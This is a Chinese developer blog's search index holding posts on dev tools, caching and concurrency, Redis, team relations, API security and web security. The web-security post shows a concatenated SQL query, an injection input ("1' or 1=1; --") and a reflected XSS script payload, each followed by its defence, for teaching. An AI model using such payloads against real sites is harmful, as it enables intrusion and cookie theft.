html查看，编辑 css查看，编辑 cookie，本地数据等查看，编辑 js断点debug 控制台警告，错误提示，调试js 性能分析 谷歌开发者工具是英文版，刚开始使用会比较不习惯，用多了就习惯了 等 火狐的Firebug 与谷歌开发者工具基本功能差不多 火狐Firebug是中文容易上手 IE开发者调试工具 基本功能大同小异 ","date":"2016-10-18","objectID":"/posts/2016-10-19-sq-shared/:0:5","tags":["开发工具"],"title":"大话WEB开发必备神器","uri":"/posts/2016-10-19-sq-shared/"},{"categories":["开发工具"],"content":"必备浏览器插件 JSONView Postman 支持发各种请求发送，支持自定义类目保存请求云同步，自定义脚本 大家还有啥推荐的留言分享吧~ ","date":"2016-10-18","objectID":"/posts/2016-10-19-sq-shared/:0:6","tags":["开发工具"],"title":"大话WEB开发必备神器","uri":"/posts/2016-10-19-sq-shared/"},{"categories":["高并发"],"content":" content {:toc} ","date":"2016-09-14","objectID":"/posts/2016-09-14-high-concurrency-scheme/:0:0","tags":["高并发"],"title":"大话程序猿眼里的高并发架构","uri":"/posts/2016-09-14-high-concurrency-scheme/"},{"categories":["高并发"],"content":"前言 高并发经常会发生在有大活跃用户量，用户高聚集的业务场景中，如：秒杀活动，定时领取红包等。 为了让业务可以流畅的运行并且给用户一个好的交互体验，我们需要根据业务场景预估达到的并发量等因素，来设计适合自己业务场景的高并发处理方案。 在电商相关产品开发的这些年，我有幸的遇到了并发下的各种坑，这一路摸爬滚打过来有着不少的血泪史，这里进行的总结，作为自己的归档记录，同时分享给大家。 ","date":"2016-09-14","objectID":"/posts/2016-09-14-high-concurrency-scheme/:0:1","tags":["高并发"],"title":"大话程序猿眼里的高并发架构","uri":"/posts/2016-09-14-high-concurrency-scheme/"},{"categories":["高并发"],"content":"服务器架构 业务从发展的初期到逐渐成熟，服务器架构也是从相对单一到集群，再到分布式服务。 一个可以支持高并发的服务少不了好的服务器架构，需要有均衡负载，数据库需要主从集群，nosql 缓存需要主从集群，静态文件需要上传 cdn，这些都是能让业务程序流畅运行的强大后盾。 服务器这块多是需要运维人员来配合搭建，具体我就不多说了，点到为止。 大致需要用到的服务器架构如下： 服务器 均衡负载(如：nginx，阿里云 SLB) 资源监控 分布式 数据库 主从分离，集群 DBA 表优化，索引优化，等 分布式 nosql redis 主从分离，集群 mongodb 主从分离，集群 memcache 主从分离，集群 cdn html css js image ","date":"2016-09-14","objectID":"/posts/2016-09-14-high-concurrency-scheme/:0:2","tags":["高并发"],"title":"大话程序猿眼里的高并发架构","uri":"/posts/2016-09-14-high-concurrency-scheme/"},{"categories":["高并发"],"content":"并发测试 高并发相关的业务，需要进行并发的测试，通过大量的数据分析评估出整个架构可以支撑的并发量。 测试高并发可以使用第三方服务器或者自己测试服务器，利用测试工具进行并发请求测试，分析测试数据得到可以支撑并发数量的评估，这个可以作为一个预警参考，俗话说知己自彼百战不殆。 第三方服务: 阿里云性能测试 并发测试工具： Apache JMeter Visual Studio 性能负载测试 Microsoft Web Application Stress Tool ","date":"2016-09-14","objectID":"/posts/2016-09-14-high-concurrency-scheme/:0:3","tags":["高并发"],"title":"大话程序猿眼里的高并发架构","uri":"/posts/2016-09-14-high-concurrency-scheme/"},{"categories":["高并发"],"content":"实战方案 通用方案 日用户流量大，但是比较分散，偶尔会有用户高聚的情况； 场景： 用户签到，用户中心，用户订单，等 服务器架构图： 说明： 场景中的这些业务基本是用户进入 APP 后会操作到的，除了活动日(618,双 11，等)，这些业务的用户量都不会高聚集，同时这些业务相关的表都是大数据表，业务多是查询操作，所以我们需要减少用户直接命中 DB 的查询；优先查询缓存，如果缓存不存在，再进行 DB 查询，将查询结果缓存起来。 更新用户相关缓存需要分布式存储，比如使用用户 ID 进行 hash 分组，把用户分布到不同的缓存中，这样一个缓存集合的总量不会很大，不会影响查询效率。 方案如： 用户签到获取积分 计算出用户分布的 key,redis hash 中查找用户今日签到信息 如果查询到签到信息，返回签到信息 如果没有查询到，DB 查询今日是否签到过，如果有签到过，就把签到信息同步 redis 缓存。 如果 DB 中也没有查询到今日的签到记录，就进行签到逻辑，操作 DB 添加今日签到记录，添加签到积分(这整个 DB 操作是一个事务) 缓存签到信息到 redis，返回签到信息 注意这里会有并发情况下的逻辑问题，如：一天签到多次，发放多次积分给用户。 我的博文[大话程序猿眼里的高并发]有相关的处理方案。 用户订单 这里我们只缓存用户第一页的订单信息，一页 40 条数据，用户一般也只会看第一页的订单数据 用户访问订单列表，如果是第一页读缓存，如果不是读 DB 计算出用户分布的 key,redis hash 中查找用户订单信息 如果查询到用户订单信息，返回订单信息 如果不存在就进行 DB 查询第一页的订单数据，然后缓存 redis，返回订单信息 用户中心 计算出用户分布的 key,redis hash 中查找用户订单信息 如果查询到用户信息，返回用户信息 如果不存在进行用户 DB 查询，然后缓存 redis，返回用户信息 其他业务 上面例子多是针对用户存储缓存，如果是公用的缓存数据需要注意一些问题，如下 注意公用的缓存数据需要考虑并发下的可能会导致大量命中 DB 查询，可以使用管理后台更新缓存，或者 DB 查询的锁住操作。 我的博文[大话 Redis 进阶]对更新缓存问题和推荐方案的分享。 以上例子是一个相对简单的高并发架构，并发量不是很高的情况可以很好的支撑，但是随着业务的壮大，用户并发量增加，我们的架构也会进行不断的优化和演变，比如对业务进行服务化，每个服务有自己的并发架构，自己的均衡服务器，分布式数据库，nosql 主从集群，如：用户服务、订单服务； 消息队列 秒杀、秒抢等活动业务，用户在瞬间涌入产生高并发请求 场景：定时领取红包，等 服务器架构图： 说明： 场景中的定时领取是一个高并发的业务，像秒杀活动用户会在到点的时间涌入，DB 瞬间就接受到一记暴击，hold 不住就会宕机，然后影响整个业务； 像这种不是只有查询的操作并且会有高并发的插入或者更新数据的业务，前面提到的通用方案就无法支撑，并发的时候都是直接命中 DB； 设计这块业务的时候就会使用消息队列的，可以将参与用户的信息添加到消息队列中，然后再写个多线程程序去消耗队列，给队列中的用户发放红包； 方案如： 定时领取红包 一般习惯使用 redis 的 list 当用户参与活动，将用户参与信息 push 到队列中 然后写个多线程程序去 pop 数据，进行发放红包的业务 这样可以支持高并发下的用户可以正常的参与活动，并且避免数据库服务器宕机的危险 附加： 通过消息队列可以做很多的服务。 如：定时短信发送服务，使用 sset(sorted set)，发送时间戳作为排序依据，短信数据队列根据时间升序，然后写个程序定时循环去读取 sset 队列中的第一条，当前时间是否超过发送时间，如果超过就进行短信发送。 一级缓存 高并发请求连接缓存服务器超出服务器能够接收的请求连接量，部分用户出现建立连接超时无法读取到数据的问题； 因此需要有个方案当高并发时候时候可以减少命中缓存服务器； 这时候就出现了一级缓存的方案，一级缓存就是使用站点服务器缓存去存储数据，注意只存储部分请求量大的数据，并且缓存的数据量要控制，不能过分的使用站点服务器的内存而影响了站点应用程序的正常运行，一级缓存需要设置秒单位的过期时间，具体时间根据业务场景设定，目的是当有高并发请求的时候可以让数据的获取命中到一级缓存，而不用连接缓存 nosql 数据服务器，减少 nosql 数据服务器的压力 比如 APP 首屏商品数据接口，这些数据是公共的不会针对用户自定义，而且这些数据不会频繁的更新，像这种接口的请求量比较大就可以加入一级缓存； 服务器架构图： 合理的规范和使用 nosql 缓存数据库，根据业务拆分缓存数据库的集群，这样基本可以很好支持业务，一级缓存毕竟是使用站点服务器缓存所以还是要善用。 静态化数据 高并发请求数据不变化的情况下如果可以不请求自己的服务器获取数据那就可以减少服务器的资源压力。 对于更新频繁度不高，并且数据允许短时间内的延迟，可以通过数据静态化成 JSON，XML,HTML 等数据文件上传 CDN，在拉取数据的时候优先到 CDN 拉取，如果没有获取到数据再从缓存，数据库中获取，当管理人员操作后台编辑数据再重新生成静态文件上传同步到 CDN，这样在高并发的时候可以使数据的获取命中在 CDN 服务器上。 CDN 节点同步有一定的延迟性，所以找一个靠谱的 CDN 服务器商也很重要 其他方案 对于更新频繁度不高的数据，APP,PC 浏览器，可以缓存数据到本地，然后每次请求接口的时候上传当前缓存数据的版本号，服务端接收到版本号判断版本号与最新数据版本号是否一致，如果不一样就进行最新数据的查询并返回最新数据和最新版本号，如果一样就返回状态码告知数据已经是最新。减少服务器压力：资源、带宽 有补充的留言给我哦 ","date":"2016-09-14","objectID":"/posts/2016-09-14-high-concurrency-scheme/:0:4","tags":["高并发"],"title":"大话程序猿眼里的高并发架构","uri":"/posts/2016-09-14-high-concurrency-scheme/"},{"categories":["Redis"],"content":" content {:toc} 使用Redis过程中，总是会遇到各种各样问题，这里进行问题的总结，作为Redis 进阶的经验分享。 ","date":"2016-08-05","objectID":"/posts/2016-08-05-redis-up/:0:0","tags":["Redis"],"title":"大话Redis进阶","uri":"/posts/2016-08-05-redis-up/"},{"categories":["Redis"],"content":"更新缓存的问题 [主动]需要操作人员去操作，或者定时调度 [被动]由用户触发更新 [预加载]提前加载好数据 方案1 [主动]后台点击更新缓存按钮，从DB查找最新数据集合，删除原缓存数据，存储新数据到缓存； 问题：更新过程中删除掉缓存后刚好有业务在查询，那么这个时候返回的数据会是空，会影响用户体验 方案2 [被动]前台获取数据时发现没有缓存数据就会去数据库同步数据到缓存 问题：当并发请求获取缓存数据不存在的时候，就会产生并发的查询数据的操作。 方案3 [主动]后台点击更新缓存按钮，从DB查找最新数据集合，这里不删除缓存，通过遍历数据覆盖和删除掉无效的数据 问题：逻辑相对麻烦，而且更新机制无法通用； 推荐 以上的几种更新方案我都遇到过，因为产生了各种问题，所以我想到了一个相对好的方案，类似预加载功能，先把数据加载到缓存中，缓存成功后再切换显示最新的数据，将旧数据设置过期； 方案4 [主动][预加载]前台获取缓存的时候需要先得到缓存数据对应的Redis Key（简称：[ShowingKey]），然后根据[ShowingKey]去读取缓存数据（简称：[缓存]; 需要两块数据： [ShowingKey]（可以是最近一次更新缓存的时间戳或者根据自己规则自定义） [缓存]（需要缓存的数据，如：DB数据等） 举个栗子： 我们现在有个业务需要缓存今日上新商品数据，缓存到Hash中 [缓存]对应Redis Key 规则 Hash Key=Goods:Todays:{0} {0}=时间戳 [ShowingKey]对应的Redis Key Key string key=Goods:Todays:ing 内容=最近一次的更新时间戳 更新逻辑： 后台编辑人员操作完数据的时候点击更新按钮，获取服务器当前时间=1469938351000=[更新时间戳]，然后获取DB数据，缓存到Goods:Todays:1469938351000中，添加缓存数据成功后，获取Goods:Todays:ing中的时间戳1449538371020=[上一次更新时间戳]，更新Goods:Todays:ing值=[更新时间戳]=1469938351000，更新成功后可以把[上一次更新时间戳]对应的缓存设置过期时间，我一般是设置5秒后过期。(注意旧数据一定要设置过期时间，不能直接删除，因为在切换[ShowingKey]的过程中可能还有业务在使用) 更新总结 第1种更新方案影响用户体验一般不推荐使用 第2种更新方案可以通过程序锁，锁住更新操作只能有一个进入DB查询，可以避免问题 第3种更新方案不会有第1，2 的问题，但是更新逻辑写起来比较麻烦，而且更新方案不能抽象通用 第4种更新方案使用提前加载到缓存，然后在切换需要显示的缓存数据，可以完美解决1,2,3中的问题 ","date":"2016-08-05","objectID":"/posts/2016-08-05-redis-up/:1:0","tags":["Redis"],"title":"大话Redis进阶","uri":"/posts/2016-08-05-redis-up/"},{"categories":["Redis"],"content":"redis内存不足，滥用 问题 数据不断累加，无效数据未清理，缓存未设置过期时间 存储数据中包含未使用到字段，整个对象序列化到redis中 冷数据，或者根本不会再去使用的无效数据没有清理 解决 数据区分无效时间，设置过期时间，使无效数据过期；（如：通过日期后缀命名Key） 区分冷数据，清理掉冷数据； 缓存数据从简，redis key命名从简，数据字段命名从简，无效字段不添加在缓存中； ","date":"2016-08-05","objectID":"/posts/2016-08-05-redis-up/:2:0","tags":["Redis"],"title":"大话Redis进阶","uri":"/posts/2016-08-05-redis-up/"},{"categories":["Redis"],"content":"键命名规范 内存数据库，键名长度影响有限内存空间，所以命名应该控制长度，简短易懂； 大小写规范 根据业务命名，相同业务统一的Key前缀 ","date":"2016-08-05","objectID":"/posts/2016-08-05-redis-up/:3:0","tags":["Redis"],"title":"大话Redis进阶","uri":"/posts/2016-08-05-redis-up/"},{"categories":["Redis"],"content":"其他经验 数值累加，get，set+1并发导致累加不准确 使用redis increment 自增数值的机制不会有累加不准确的问题 .net 类库 ServiceStack 3.9.71.0 的一个问题 SetEntryInHash 返回 bool，只有第一次新增的时候返回的是true，后面修改成功了也都是返回false 源码：SetEntryInHash 方法，读取hset的结果 判断是否等于1，返回bool 我们通过命令： hset 第一次sflyq key不存在，添加成功返回的执行结果是：1 hset 第一次sflyq key已经存在，修改成功购返回结果：0 所以结果很明显，通过SetEntryInHash 判断hash是否key value 是否设置成功是有问题的，只有第一次设置会返回 ture 未完待续… 有补充的留言给我哦 ","date":"2016-08-05","objectID":"/posts/2016-08-05-redis-up/:4:0","tags":["Redis"],"title":"大话Redis进阶","uri":"/posts/2016-08-05-redis-up/"},{"categories":["程序员"],"content":" content {:toc} 一个好的互联网公司都离不开好的产品经理，对产品有着充分理解、有强大的分析判断和执行的能力、有良好的沟通和表达能力，对未来自市场、用户等各方面的需求进行收集，编写产品的需求文档； 产品提出需求，程序猿根据需求设计开发方案，在项目的开发过程中程序猿和产品有很多的交集，不断的讨论碰撞，今天就让我们来好好的说一说程序猿和产品狗的恩恩怨怨吧。 申明以下产品狗只是一个褒义的称呼，如：程序猿、攻城狮、射鸡师、产品狗 ","date":"2016-06-26","objectID":"/posts/2016-06-28-cpgandcxy/:0:0","tags":["程序员","项目开发"],"title":"大话程序猿VS产品狗","uri":"/posts/2016-06-28-cpgandcxy/"},{"categories":["程序员"],"content":"程序猿 VS 产品狗 产品狗：(｡･∀･)ﾉﾞ嗨，这块业务你做了吗，我们需要调整下，因为之前逻辑有点问题.. 程序猿：/(ㄒ o ㄒ)/~~，又改需求，确定的需求能不能不再改了，你总是能给我理由，受伤害的总是我！ 产品狗：相信我这是最后一次修改。 程序猿OS：这个本年度最不可信十大的谎言之一，我可以说脏话吗？FK 哔哔 * 不同的开发阶段修改需求代价不一样，越到后期代价越高，产品狗请三思，程序猿应该根据修改内容上报上级，不能默默的承受了，不惯着产品随意改需求。 产品狗：这个需求和之前项目的很像，你应该可以很快完成吧？ 产品狗OS：不就 copy and paste，应该很快; 程序猿：之前不是设计成通用的服务或者模块，这次需要重新做； 程序猿OS：你把我当成是代码的帮运工么 产品狗：。。。 通用业务模块化，组件化，系统化，产品在设计的时候需要考虑，程序猿在需求会的时候也应该根据需求内容提出建议。 产品狗：这个上线出问题了，旧版本不兼容，导致….，先加个版本控制吧 程序猿：又加版本控制，下次需求能不能把这种问题考虑进去。 产品狗：。。。 产品需求在做需求的时候需要考虑周全，需要考虑新旧版本交替问题,以及需求相关联的业务影响问题,等 程序猿在需求会的时候根据自己对业务的了解提出问题 产品狗：本期需求内容是这样的，巴拉巴拉，功能模块*N…..； 程序猿：这期需求内容有点多，我们预估下开发时间有点长，我建议分期开发； 产品狗：本期需求内容都是很重要的，我们期望可以同时完成上线； 程序猿：意思是要加班完成喽。。。 程序猿OS：我可不想加班到狗带； 需求内容过多无法按照产品的期望时间上线，往往要通过加班来填补，这种燃烧生命在工作的方式不提倡，而且加班赶工人在疲劳的状态下写的代码一般都很难维护和拓展，bug 率也会变高。 产品应该根据程序猿提出的评估进行需求上的调整分期开发。 还有很多的情景，一时间没想起来，大家一起来补充 … … ","date":"2016-06-26","objectID":"/posts/2016-06-28-cpgandcxy/:0:1","tags":["程序员","项目开发"],"title":"大话程序猿VS产品狗","uri":"/posts/2016-06-28-cpgandcxy/"},{"categories":["程序员"],"content":"总结产品的几大宗罪 动不动就修改需求 猿的供词： 无论开发到哪个阶段，产品总是有着突如其来的灵感，这个 UI 要调整下，那个业务逻辑修改下比较合理，有时候甚至是打掉原有方案重做，玩我么？ 联盟调解： 在开发的过程中需求的调整是不能完全避免的，但是理应在需求讨论的时候就把所有的内容确认清楚，竟可能的不在开发的过程中进行需求的调整， 不同的开发阶段修改需求的代价不一样，越到后期代价越高，所以产品狗们请三思，非严重或者市场战略的业务逻辑问题就考虑下一期调整， 程序猿需要 hold 住需求的修改要求，禀报上级，不能让产品养成随意修改需求的习惯。 需求内容不够详细 猿的供词： 需求惜字如金，缺少必要的描述，什么鬼，看需求文档完全不知道要做什么？ 联盟调解: 需求内容应当尽量的详细，复杂逻辑需要给出流程图，在不需要解释的情况下能让人看懂本期需求要做内容的文档才是好文档。 需求考虑不周全 猿的供词： 眼光紧现本期需求内容，往往没有去考虑细节问题，长远问题，需求连带业务问题，上线后发现问题手忙脚乱。 联盟调解: 产品需要考虑新旧版本交替问题,以及需求相关联的业务影响问题,需求设计模块化，组件化，系统化思维，等。 程序猿也应该根据自己的经验和对业务的了解提出建议。 需求缺少数据依据 猿的供词： 需求中都没有对本期需求提供数据的依据，感觉整天都是为了做需求而做需求，一点成就感都没有,没干劲.. 联盟调解： 产品的需求中应该有对本期需求的内容提供相关的数据依据，比如：上期的优化数据结果展示，本期优化预计会达到多少转化率、参与量，新业务预计要达到多少的用户量、转化率多少，等 数据是最有说服力的，可以表现项目的价值，以及带给我们成就感，同时对开发的设计方案也有一定参考作用。 项目流程不熟悉 猿的供词： 需求还没确定清楚就开立项会，甚至还在立项会修改需求，我的眼睛，已瞎… 联盟调解： 立项会是要对本期要做的内容进行成立项目，并且根据本期内容排人员以及开发周期包括：开发，测试，验收，上线，线上验收等，整个的时间周期； 产品需要严格遵守项目开发流程，做一个有节操的产品狗; 需求内容没有创新，跟着竞品的脚步 猿的供词： 需求怎么老是跟着竞品的脚步走，喜欢一直在模仿从未被超越的感觉？ 联盟调解： 竞品之间相互的参考和模仿这个是必然存在的，这算是投机取巧的一种方式，毕竟一个好的需求要想出来不是一件容易的事情，不过还是建议可以参考，不要一味地模仿， 虽然高仿也可以走出一片天，如互联网大亨 T*,运动品牌阿迪王，好矛盾的话题。 ","date":"2016-06-26","objectID":"/posts/2016-06-28-cpgandcxy/:0:2","tags":["程序员","项目开发"],"title":"大话程序猿VS产品狗","uri":"/posts/2016-06-28-cpgandcxy/"},{"categories":["程序员"],"content":"话题： 身为程序猿的你对身边的产品狗有哪些看法？躁起来吧 产品狗也可以来吐槽下程序猿，别忍了，亮剑吧~ 留言讨论 GOGOGOGO ","date":"2016-06-26","objectID":"/posts/2016-06-28-cpgandcxy/:0:3","tags":["程序员","项目开发"],"title":"大话程序猿VS产品狗","uri":"/posts/2016-06-28-cpgandcxy/"},{"categories":["安全"],"content":" content {:toc} 作为后端程序猿自己写的接口就像自己的孩子一样，尽然制造出来了，那就要对他以后的人生负责到底； 随着业务的壮大，需要支撑业务接口也越来越多，使用的用户量变大，虎视眈眈的黑客们视机而动，总是在业务中寻找着可以窃取他人利益的入口，所以我们应该多考虑安全性问题，防范于未然。 ","date":"2016-06-05","objectID":"/posts/2016-06-06-donot-touch-my-url/:0:0","tags":["安全","签名","接口","抓包"],"title":"大话接口隐私与安全","uri":"/posts/2016-06-06-donot-touch-my-url/"},{"categories":["安全"],"content":"场景 服务端程序猿根据需求开发出业务相关的接口，用来满足需求中用户和服务器交互的功能，提供给前端或者客户端（PC 端软件，APP 端应用）使用， 大部分程序猿在开发接口的时候就仅仅去考虑如何实现业务上的逻辑功能，而往往很少会去考虑接口的安全性问题， 一般服务端提供的接口都是 http/https 协议的，通过 Fiddler，Wireshark，Charles 等抓包工具，可以抓取到请求，然后进行分析，模拟请求，进行并发请求，或者修改信息的攻击。 ","date":"2016-06-05","objectID":"/posts/2016-06-06-donot-touch-my-url/:1:0","tags":["安全","签名","接口","抓包"],"title":"大话接口隐私与安全","uri":"/posts/2016-06-06-donot-touch-my-url/"},{"categories":["安全"],"content":"例子： 问题 1. 接口暴露用户隐私信息就相当于在光天化日下裸奔，被看光了 描述：程序猿在做业务接口的时候往往没有保护用户隐私的意识，把用户的隐私信息暴露在外面，一旦被人利用起来会给用户带来麻烦，同时被发现会降低平台的信任度； 防： 用户隐私数据加密，加*号，如用户的相关数据的 JSON 中有用户手机号，用户邮箱，支付账号，邮寄地址等隐私数据； 用户请求接口时需要对其隐私参数加密：如用户登陆请求登陆接口，需要将用户密码进行可逆加密，以免接口被恶意代理捕捉请求后获取明文密码； 分享出去的地址中不要用明文的用户 ID，或者用户登录的 token 问题 2. 接口暴露敏感信息，就像把钥匙插在钥匙口没拔掉一样，只要你会开门就能进去 用户参与活动的数据 JSON 集合中不要有活动相关业务逻辑的决定性的数据,如：竞拍出价活动，出价唯一最低者拿奖品，结果获取出价的接口暴露了所有出价的价格统计结果。 防： 数据中需要将敏感字段,或者对业务有着决定性作用的字段中的部分字符串加*; 问题 3.数据被人顺手带走(主业务接口相关 JSON 数据 如：首页商品列表数据) 描述：接口中的 JSON 数据会被其他人拿去做自己的相关的功能；这样就造成了服务器的额外支出 防： IP 请求量限制，时间范围内请求量限制，等各种限制 IP 请求的规则， 如：统计记录(可以记录到 mongdb 中)，定时监控记录发现请求量大于限制的数量就进行 IP 封杀; 请求头的校验，如：User-Agent 校验请求头是不是 APP 客服端发起，Referer 是不是有来源，来源域名是不是自己的域名地址等(这种方式只能是多一个门槛)； 问题 4.移花接木，恶意修改请求信息(修改参数，COOKIE，请求头信息) 描述：通过修改请求中的参数来发起的请求，如：登陆接口修改用户名和用户密码，进行密码库碰撞等。 温馨提示： 修改请求参数可能会导致很多安全性问题，如：SQL 注入，XSS 跨站脚本攻击等，传送门我的【大话程序猿眼里的 WEB 安全】有相关的介绍和解决方案 以下方案都针对客户端，如 PC 软件和 APP，WEB 端 JS 去做加密的话不是很推荐，JS 代码是暴露出来的，所以如果用 JS 做加密一定要混淆 JS 代码 防： 增加一个签名参数，将参数名进行逻辑的排序组合拼接+秘钥 MD5，然后服务端接受到请求的时候也用同样的逻辑得到签名与签名参数进行对比是否相同，这样可以使参数无法被修改，修改了就提示非法请求。 如： 接口http://www.test.com/go/?actid=1\u0026userid=123 我们可以加一个 sign 参数= MD5(actid=1\u0026userid=123\u0026【secret】)【secret】=秘钥，自己定义。 服务端用一样的逻辑得到密文和 sign 签名进行对比是否一样，不一样就提示非法请求。 整个参数内容进行可逆的加密 限制参数范围，如：支持分页接口，很多人会为了方便使用，加了参数就是 pagesize(一页的数据量)，当没有去限制页码最大值得时候，如果表数据量很大，然后攻击者修改 pagesize 参数为 N 万，然后数据库就奔溃了,相关业务就挂了。 问题 5.影分身术，模拟请求，发起并发请求 描述：通过抓包工具抓到请求后模拟请求，如：模拟每日签到请求，或者直接发起每日签到的并发请求。 温馨提示：当请求并发后如何保证数据的完整性，一致性问题，这也是平时开发很需要注意的问题，传送门我的【大话程序员眼里的高并发】有相关的介绍和解决方案。 防: 模拟并发请求，IP 限制同上问题 2 的解决方案。 请求信息带上时间(可逆加密的时间)，服务端获取时间，超过限定时间的返回请求超时(目的使抓取到的请求不是一直有效的)。 用户 token,等标识用户重要的信息数据，保存 COOKIE 需要设置过期时间，或者加密的明文里要有创建的时间，服务端做对应的时间失效的限制，这样即使 COOKIE 被别人盗取，模拟请求也会随着时间而失效; ","date":"2016-06-05","objectID":"/posts/2016-06-06-donot-touch-my-url/:2:0","tags":["安全","签名","接口","抓包"],"title":"大话接口隐私与安全","uri":"/posts/2016-06-06-donot-touch-my-url/"},{"categories":["安全"],"content":"总结 我们需要提高自己的安全意识，防范于未然，要多站在攻击者的角度来看自己的接口;(让自己有一种被害妄想症的感觉，你就离精神病近了一步，\u003c(￣︶￣)↗ ) 不要做开发需求的机器人，我们是有思想有创造力的开发者; 附加个人开发流程 在评审需求的时候要把业务逻辑问题提出来，并给予解决方案的选择; 确定需求后将整个业务逻辑的梳理清楚，复杂的可以画出流程图; 根据需求设计实现方案，需要考虑性能问题[数据库压力，服务器压力]，安全问题，用文档的形式记录下自己的设计方案。（可以深入到代码层面如何去实现）; 列出需求中功能点，评估出自己的时间，得到总工时; 开始开发，开干; ","date":"2016-06-05","objectID":"/posts/2016-06-06-donot-touch-my-url/:3:0","tags":["安全","签名","接口","抓包"],"title":"大话接口隐私与安全","uri":"/posts/2016-06-06-donot-touch-my-url/"},{"categories":["安全"],"content":" content {:toc} WEB 安全 ","date":"2016-04-03","objectID":"/posts/2016-04-04-safe/:0:0","tags":["安全","脚本注入","XSS","CSRF","HTTP劫持","DDOS"],"title":"大话WEB安全","uri":"/posts/2016-04-04-safe/"},{"categories":["安全"],"content":"索引 SQL 脚本注入 XSS 跨站脚本攻击 CSRF 跨站请求伪造 HTTP 劫持 DDOS 攻击 其他 ","date":"2016-04-03","objectID":"/posts/2016-04-04-safe/:1:0","tags":["安全","脚本注入","XSS","CSRF","HTTP劫持","DDOS"],"title":"大话WEB安全","uri":"/posts/2016-04-04-safe/"},{"categories":["安全"],"content":"SQL 脚本注入 危险级数☆☆☆☆☆☆ 简介：SQL 脚本注入，就是在请求 URL 的参数中传入 SQL 语句，然后导致 DAL 中的语句+注入的 SQL 语句连接上 DB 进行 SQL 语句的执行； 攻击力：轻则数据暴露，刷爆数据库，重则表数据被恶意编辑，删除，或者表被删除； 情景：http://wwww.xxx.com/search?title=123 进行标题内容的查询，如果 DAL 层中的语句使用拼接的方式去写， 如： //DAL public List\u003cMDatas\u003e searchs(var title=\"\"){ if(title.isNullOrEmpty())reurn; var sqlStr=@\" select fields from tablename where title title='\"+title+\"'\"; //下面 链接DB执行语句返回数据table绑定对象集合 省略。。。 //.... } 当我请求数据接口的时候：http://wwww.xxx.com/search?title=1' or 1=1; - - 这个时候就会查出所有的表数据，如果我在后面插入一条删除表的语句，等。。。危险的 SQL 语句，那就 GAME OVER 了。 防御： .net 本身有这个安全机制，只要传入的参数是有 SQL，或者 JavaScript 会提示危险参数，可以通过配置 webconfig，或者路由方法的属性来开启和关闭。 但是最保险的方案还是要自己平时在写 DAL 的时候要注意，SQL 语句不要使用拼接的方式，都使用参数化的方式，这样就不会出现 SQL 注入的问题了； 如： //DAL public List\u003cMDatas\u003e searchs(var title=\"\"){ if(title.isNullOrEmpty())reurn; var sqlStr=@\" select fields from tablename where title title=@title; //下面 链接DB执行语句返回数据table绑定对象集合 省略。。。 //.... } ","date":"2016-04-03","objectID":"/posts/2016-04-04-safe/:2:0","tags":["安全","脚本注入","XSS","CSRF","HTTP劫持","DDOS"],"title":"大话WEB安全","uri":"/posts/2016-04-04-safe/"},{"categories":["安全"],"content":"XSS 跨站脚本攻击 危险级数☆☆☆☆☆☆ 简介：跨站的脚本攻击，就是在请求 URL 参数中，或者 form 提交的内容中注入 JavaScript 脚本； 攻击力：轻则用户体验异常弹窗，重则用户 cookie 数据被盗取，引导用户到非法地址； 场景：http://www.xx.com/userinfo/?username=吊毛\u0026description=sb userinfo 视图： \u003c!-- 省略顶部 --\u003e \u003cdiv\u003e \u003cp\u003e@username\u003cp\u003e \u003cp\u003e@description\u003c/p\u003e \u003c/div\u003e \u003c!-- 省略底部 --\u003e 当我修改参数：http://www.xx.com/userinfo/?username=吊毛\u0026description=sb\u003cscript type=\"text/javascript\"\u003ealert('sb')\u003c/script\u003e userinfo 视图： \u003c!-- 省略顶部 --\u003e \u003cdiv\u003e \u003cp\u003e吊毛\u003cp\u003e \u003cp\u003e sb \u003cscript type=\"text/javascript\"\u003ealert('sb')\u003c/script\u003e \u003c/p\u003e \u003c/div\u003e \u003c!-- 省略底部 --\u003e 这个时候把这个地址分享给别人，他一打开就会弹出一个弹窗； 如果这个时候我注入的脚本是获取 cookie 到我的接口，然后把地址分享给其他的用户，这样就可以通过获取到的 cookie 模拟用户的登陆了； form 提交就不举例了，也是一样，就是提交的内容里输入 JavaScript 脚本，然后绑定内容的时候没有进行处理，这样就会导致上面一样的问题。 防御：在视图绑定数据的时候(前端拼接，或者服务端脚本绑定)需要对数据进行 HTML 编码 结果如： \u003c!-- 省略顶部 --\u003e \u003cdiv\u003e \u003cp\u003e吊毛\u003cp\u003e \u003cp\u003e sb \u0026lt;script type=\u0026quot;text/javascript\u0026quot;\u0026gt;alert(\u0026#39;sb\u0026#39;)\u0026lt;/script\u0026gt; \u003c/p\u003e \u003c/div\u003e \u003c!-- 省略底部 --\u003e ","date":"2016-04-03","objectID":"/posts/2016-04-04-safe/:3:0","tags":["安全","脚本注入","XSS","CSRF","HTTP劫持","DDOS"],"title":"大话WEB安全","uri":"/posts/2016-04-04-safe/"},{"categories":["安全"],"content":"CSRF 跨站请求伪造 危险级数☆☆☆☆☆☆ 简介：跨站请求伪造，就是当 A 站用户未退出的情况下，通过其他非法 B 站发起非法请求来触发 A 站的请求操作；用户在不知情的请求下被诱导操作 攻击力：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账，个人隐私泄露以及财产安全 情景： 具体可以看博文 防御：用户进入操作页面的时候绑定令牌到隐藏 input，服务端进行令牌的校验，重要的操作，如：提现，充值，等，添加验证码 ","date":"2016-04-03","objectID":"/posts/2016-04-04-safe/:4:0","tags":["安全","脚本注入","XSS","CSRF","HTTP劫持","DDOS"],"title":"大话WEB安全","uri":"/posts/2016-04-04-safe/"},{"categories":["安全"],"content":"HTTP 劫持 危险级数☆☆☆☆ 简介：你打开的是百度的页面，右下角弹出唐老师的不孕不育广告。 攻击力：注入广告 情景：在公共场所有很多免费的 WIFI，有些免费的 WIFI 会对 HTTP 进行劫持，然后修改 html 注入广告，网络供应商也会进行 HTTP 劫持 ， 如使用移动网络的时候经常会出现移动广告 防御：可以将 HTTP 替换成 HTTPS 这样，劫持后没有证书无法进行解密，就无法注入广告了。 ","date":"2016-04-03","objectID":"/posts/2016-04-04-safe/:5:0","tags":["安全","脚本注入","XSS","CSRF","HTTP劫持","DDOS"],"title":"大话WEB安全","uri":"/posts/2016-04-04-safe/"},{"categories":["安全"],"content":"DOSS 攻击 危险级数☆☆☆☆☆☆☆ 简介：分布式拒绝服务攻击，俗称洪水攻击，通过木马寄生在用户机子，当成肉机，需要的时候发起群攻 攻击力：刷爆服务器 防御：需要再服务器部署安全防火墙。(具体方案待研究… …) 未完待续。。。 